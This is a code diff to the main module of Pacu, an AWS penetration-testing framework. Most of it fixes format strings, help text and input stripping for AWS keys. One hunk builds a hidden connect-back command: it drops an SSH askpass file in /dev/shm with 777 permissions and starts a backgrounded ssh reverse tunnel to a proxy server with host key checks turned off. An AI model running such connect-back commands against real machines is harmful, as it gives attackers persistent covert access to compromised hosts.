@@ -827,7 +827,7 @@ class Main:
                                 shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
 
                             # Create an in-memory file in /dev/shm that contains the password
-                            create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
+                            create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name, shm_name)
 
                             # Give the file 777 permissions
                             add_permissions = 'chmod 777 /dev/shm/{}'.format(shm_name)
@@ -838,7 +838,7 @@ class Main:
                             # Runs ssh to connect to the PacuProxy server over SSH while forwarding a port,
                             # without trying to open a shell, but keeping a persistent connection, and
                             # redirecting stderr to stdout (which then comes back to PacuProxy)
-                            connect = 'DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -o StrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(shm_name, proxy_ssh_username@proxy_ip)
+                            connect = 'DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -o StrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(shm_name, proxy_ssh_username, proxy_ip)
 
                             # Combine the commands into a one-liner
                             connect_back_cmd = '{} && {} && {}'.format(create_shm, add_permissions, connect)
@@ -906,6 +906,10 @@ class Main:
                                                   default
             swap_keys                           Change the currently active AWS key to another key that has
                                                   previously been set for this session
+            import_keys <profile name>|--all    Import AWS keys from the AWS CLI credentials file (located
+                                                  at ~/.aws/credentials) to the current sessions database. 
+                                                  Enter the name of a profile you would like to import or 
+                                                  supply --all to import all the credentials in the file.
             exit/quit                           Exit Pacu
 
         Other command info:
@@ -977,7 +981,7 @@ class Main:
 
     def update_regions(self):
         py_executable = sys.executable
-        # Update boto3 and botocore to fetch the latest version of the AWS region_list
+        # Update botocore to fetch the latest version of the AWS region_list
         try:
             self.print('  Fetching latest botocore...\n')
             subprocess.run([py_executable, '-m', 'pip', 'install', '--upgrade', 'botocore'])
@@ -1117,7 +1121,7 @@ class Main:
         elif command_name == 'list' or command_name == 'ls':
             print('\n    list/ls\n        List all modules\n')
         elif command_name == 'import_keys':
-            print('\n    import_keys <profile name>|--all\n      Import AWS keys from the AWS CLI credentials file (Located at ~/.aws/credentials) to the current sessions database. Enter the name of a profile you would like to import or supply --all to import all the credentials in the file.\n')
+            print('\n    import_keys <profile name>|--all\n      Import AWS keys from the AWS CLI credentials file (located at ~/.aws/credentials) to the current sessions database. Enter the name of a profile you would like to import or supply --all to import all the credentials in the file.\n')
         elif command_name == 'aws':
             print('\n    aws <command>\n        Use the AWS CLI directly. This command runs in your local shell to use the AWS CLI. Warning: The AWS CLI\'s authentication is not related to Pacu. Be careful to ensure that you are using the keys you want when using the AWS CLI. It is suggested to use AWS CLI profiles to help solve this problem\n')
         elif command_name == 'search':
@@ -1161,7 +1165,7 @@ class Main:
                 print('External dependencies: {}\n'.format(module.module_info['external_dependencies']))
 
             parser_help = module.parser.format_help()
-            print(parser_help.replace(os.path.basename(__file__), 'exec {}'.format(module.module_info['name']), 1))
+            print(parser_help.replace(os.path.basename(__file__), 'run {}'.format(module.module_info['name']), 1))
             return
 
         else:
@@ -1260,12 +1264,12 @@ class Main:
         if key_alias is None:
             new_value = self.input('Key alias [{}]: '.format(session.key_alias))
         else:
-            new_value = key_alias
+            new_value = key_alias.strip()
             self.print('Key alias [{}]: {}'.format(session.key_alias, new_value), output='file')
         if str(new_value.strip().lower()) == 'c':
             session.key_alias = None
         elif str(new_value) != '':
-            session.key_alias = new_value
+            session.key_alias = new_value.strip()
 
         # Access key ID
         if key_alias is None:
@@ -1276,7 +1280,7 @@ class Main:
         if str(new_value.strip().lower()) == 'c':
             session.access_key_id = None
         elif str(new_value) != '':
-            session.access_key_id = new_value
+            session.access_key_id = new_value.strip()
 
         # Secret access key (should not be entered in log files)
         if key_alias is None:
@@ -1290,7 +1294,7 @@ class Main:
         if str(new_value.strip().lower()) == 'c':
             session.secret_access_key = None
         elif str(new_value) != '':
-            session.secret_access_key = new_value
+            session.secret_access_key = new_value.strip()
 
         # Session token (optional)
         if key_alias is None:
@@ -1303,7 +1307,7 @@ class Main:
         if str(new_value.strip().lower()) == 'c':
             session.session_token = None
         elif str(new_value) != '':
-            session.session_token = new_value
+            session.session_token = new_value.strip()
 
         self.database.add(session)
 
